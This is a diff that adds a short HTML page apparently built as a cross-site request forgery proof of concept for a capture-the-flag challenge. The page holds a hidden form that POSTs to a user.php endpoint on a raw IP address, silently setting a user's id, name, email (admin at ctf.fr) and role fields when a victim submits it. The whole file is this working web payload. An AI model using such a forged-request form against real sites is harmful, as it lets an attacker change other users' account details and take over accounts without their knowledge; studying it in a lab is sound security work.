@@ -1,0 +1,13 @@
+<html>
+	<body>
+		<form method="POST" action="https://51.44.165.35:49154/user.php">
+			<input type="hidden" name="id" value="19483756"/>
+			<input type="hidden" name="lastname" value="Test"/>
+			<input type="hidden" name="firstname" value="Test"/>
+			<input type="hidden" name="email" value="admin%40ctf.fr"/>
+			<input type="hidden" name="role" value="invite"/>
+			<input type="submit" value="Submit">
+		</form>
+
+	</body>
+<html>
